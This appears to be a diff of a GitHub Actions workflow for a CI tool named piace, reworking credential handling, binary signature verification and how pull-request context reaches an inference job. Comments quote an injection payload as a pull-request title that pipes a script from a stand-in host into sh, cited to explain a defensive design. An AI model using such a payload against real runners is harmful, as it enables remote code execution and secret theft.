@@ -3,16 +3,19 @@
 # Copy to .github/workflows/piace.yml in your control repository, with the
 # layout docs/ci.md describes:
 #
-#   ci/piace/targets.yaml            committed, reviewable policy
-#   ci/piace/services.yaml.tmpl      committed, rendered per job
-#   ci/piace/services-explain.yaml   committed, inference only
-#   ci/piace/policy-notes.md         committed, site policy for the model
-#   ci/piace/change-context.sh       committed, copied from PIACE's scripts/
+#   ci/piace/targets.yaml     committed, reviewable policy
+#   ci/piace/services.yaml    committed, endpoints and credential references
+#   ci/piace/policy-notes.md  committed, optional site policy for the model
+#
+# Three files, and none of them is rendered, copied or rewritten by a job.
+# The services file names its TLS material through `*_env`, so the committed
+# file is read in place: see examples/ci/services.yaml.
 #
 # Two jobs, not one, because they need different credentials: `compare` holds
 # the catalog-reader identity and never sees the inference token, `explain`
 # holds the inference token and never sees a private key. A runner compromise
-# in either job yields one of the two.
+# in either job yields one of the two. That separation lives in which secrets
+# each job is granted, not in which file it reads.
 
 name: piace
 
@@ -25,7 +28,7 @@ permissions:
   contents: read
 
 env:
-  PIACE_VERSION: '0.2.1'
+  PIACE_VERSION: '0.3.0'
 
 jobs:
   compare:
@@ -38,13 +41,19 @@ jobs:
     steps:
       - uses: actions/checkout@v4
         with:
-          # change-context.sh takes a merge base, which a shallow clone does
-          # not have.
+          # `piace change-context` takes a merge base, which a shallow clone
+          # does not have.
           fetch-depth: 0
 
       # Pinned to a version and verified against the manifest published with
       # it. A runner that fetches "the latest binary" from the internet on
       # every run is a supply chain you do not control.
+      #
+      # Skip this step entirely if the binary is already on the runner: baked
+      # into a self-hosted runner image, installed by the host's own
+      # configuration management, or mirrored into an internal artifact
+      # repository. Nothing here resolves a dependency at run time, so a
+      # `piace` on PATH is the whole install.
       - name: Install piace
         run: |
           set -euo pipefail
@@ -59,9 +68,11 @@ jobs:
           grep " piace-${PIACE_VERSION}-linux-amd64\$" SHA256SUMS | sha256sum -c -
           install -m 0755 "piace-${PIACE_VERSION}-linux-amd64" piace
           echo "$RUNNER_TEMP/piace-bin" >> "$GITHUB_PATH"
-          # Once the detached signature is attached to the release, verify it
-          # here first and drop the checksum line above to a second step:
-          #   gpg --verify SHA256SUMS.asc SHA256SUMS
+          # Where cosign is available, verify the signature first and treat
+          # the checksum as the second step rather than the only one:
+          #   cosign verify-blob SHA256SUMS --bundle SHA256SUMS.sigstore.json \
+          #     --certificate-identity "https://github.com/example42/piace/.github/workflows/ci.yml@refs/tags/v${PIACE_VERSION}" \
+          #     --certificate-oidc-issuer https://token.actions.githubusercontent.com
 
       # $RUNNER_TEMP is per-job and outside the checkout, which is what makes
       # it the right home for a private key: nothing here reaches actions/cache,
@@ -69,20 +80,28 @@ jobs:
       #
       # No `set -x` in this step, ever. The secrets themselves are never
       # echoed; a trace of the commands that write them would be.
-      - name: Render the services file and write the catalog-reader identity
+      # A GitHub secret is a value, not a path, so this job writes the three
+      # PEMs to files and exports their paths. ci/piace/services.yaml names
+      # those three variables with ca_bundle_env, client_cert_env and
+      # private_key_env, so the committed file is read in place and nothing
+      # renders or copies it.
+      - name: Write the catalog-reader identity
         env:
-          PIACE_CA_BUNDLE: ${{ secrets.PIACE_CA_BUNDLE }}
-          PIACE_CLIENT_CERT: ${{ secrets.PIACE_CLIENT_CERT }}
-          PIACE_PRIVATE_KEY: ${{ secrets.PIACE_PRIVATE_KEY }}
+          CA_BUNDLE: ${{ secrets.PIACE_CA_BUNDLE }}
+          CLIENT_CERT: ${{ secrets.PIACE_CLIENT_CERT }}
+          PRIVATE_KEY: ${{ secrets.PIACE_PRIVATE_KEY }}
         run: |
           set -euo pipefail
           umask 077
           install -d -m 0700 "$RUNNER_TEMP/piace-run"
-          printf '%s\n' "$PIACE_CA_BUNDLE"   > "$RUNNER_TEMP/piace-run/ca.pem"
-          printf '%s\n' "$PIACE_CLIENT_CERT" > "$RUNNER_TEMP/piace-run/client.pem"
-          printf '%s\n' "$PIACE_PRIVATE_KEY" > "$RUNNER_TEMP/piace-run/client.key"
-          sed "s|@PIACE_RUN@|$RUNNER_TEMP/piace-run|g" ci/piace/services.yaml.tmpl \
-            > "$RUNNER_TEMP/piace-run/services.yaml"
+          printf '%s\n' "$CA_BUNDLE"   > "$RUNNER_TEMP/piace-run/ca.pem"
+          printf '%s\n' "$CLIENT_CERT" > "$RUNNER_TEMP/piace-run/client.pem"
+          printf '%s\n' "$PRIVATE_KEY" > "$RUNNER_TEMP/piace-run/client.key"
+          {
+            echo "PIACE_CA_BUNDLE=$RUNNER_TEMP/piace-run/ca.pem"
+            echo "PIACE_CLIENT_CERT=$RUNNER_TEMP/piace-run/client.pem"
+            echo "PIACE_PRIVATE_KEY=$RUNNER_TEMP/piace-run/client.key"
+          } >> "$GITHUB_ENV"
 
       # Exit 10 is a policy difference, which fails the step and so the job:
       # that is `fail_on_diff: true` in targets.yaml doing its work. 20 and 30
@@ -110,7 +129,7 @@ jobs:
           candidate_environment="$(printf '%s' "$HEAD_REF" | tr '-' '_')"
           piace compare \
             --targets ci/piace/targets.yaml \
-            --services "$RUNNER_TEMP/piace-run/services.yaml" \
+            --services ci/piace/services.yaml \
             --candidate-environment "$candidate_environment" \
             --json-out report.json \
             --html-out report.html
@@ -169,37 +188,37 @@ jobs:
         with:
           name: piace-report
 
-      # PIACE never invokes git. This script does, in the checkout, on the
-      # runner: commit subjects and changed paths only, never bodies. Read
-      # examples/change-context.yaml before enabling it. Everything in the
+      # `change-context` is the one subcommand that runs git, and it is
+      # optional. Commit subjects and changed paths only, never bodies. Read
+      # examples/change-context.yaml before enabling it: everything in the
       # generated file is forwarded to the inference service as data, and the
       # change context is not pseudonymized.
       #
-      # Every value below arrives through `env:`, never through `${{ }}` inside
-      # the run block. `${{ }}` is substituted into the script text before a
-      # shell sees it, so a pull request titled `"; curl evil.example/x | sh; #`
-      # would run on this runner, and a pull request title is attacker-supplied
-      # by definition. The base ref goes the same way: a git branch name may
-      # legally contain `;`, `$` and a backtick.
-      #
-      # The generator stops at commit subjects and changed paths. Title and
-      # description belong to the pull request, which git does not have, and
-      # without them the model never learns what the change is for. A literal
-      # block scalar because a body is multi-line and a title contains colons.
+      # Every untrusted value is passed by NAME, never by value. `${{ }}` is
+      # substituted into the script text before a shell sees it, so a pull
+      # request titled `"; curl evil.example/x | sh; #` would otherwise run on
+      # this runner, and a pull request title is attacker-supplied by
+      # definition. A branch name may legally contain `;`, `$` and a backtick,
+      # so the base ref is named too. There is deliberately no --title flag to
+      # substitute a value into.
       - name: Describe the change
         if: steps.reports.outcome == 'success'
         env:
           BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
           PR_TITLE: ${{ github.event.pull_request.title }}
           PR_BODY: ${{ github.event.pull_request.body }}
         run: |
-          ci/piace/change-context.sh "origin/$BASE_REF" HEAD > change-context.yaml
-          {
-            printf '  title: |\n'
-            printf '%s\n' "$PR_TITLE" | sed 's/^/    /'
-            printf '  description: |\n'
-            printf '%s\n' "$PR_BODY"  | sed 's/^/    /'
-          } >> change-context.yaml
+          # --head-ref-env is not decoration here: a pull_request checkout is
+          # detached at a temporary merge commit, so asking git for the branch
+          # name yields the literal "HEAD" and the assessment never learns
+          # which branch it is reading.
+          BASE_REF="origin/$BASE_REF" piace change-context \
+            --base-ref-env BASE_REF \
+            --head-ref-env HEAD_REF \
+            --title-env PR_TITLE \
+            --description-env PR_BODY \
+            > change-context.yaml
 
       # The token is referenced by name; there is no field that inlines one.
       # `explain` cannot change an exit code, so a failure here is advisory
@@ -211,7 +230,7 @@ jobs:
         run: |
           piace explain \
             --json-in report.json \
-            --services ci/piace/services-explain.yaml \
+            --services ci/piace/services.yaml \
             --change change-context.yaml \
             --ai-out assessment.json \
             --html-out report.html
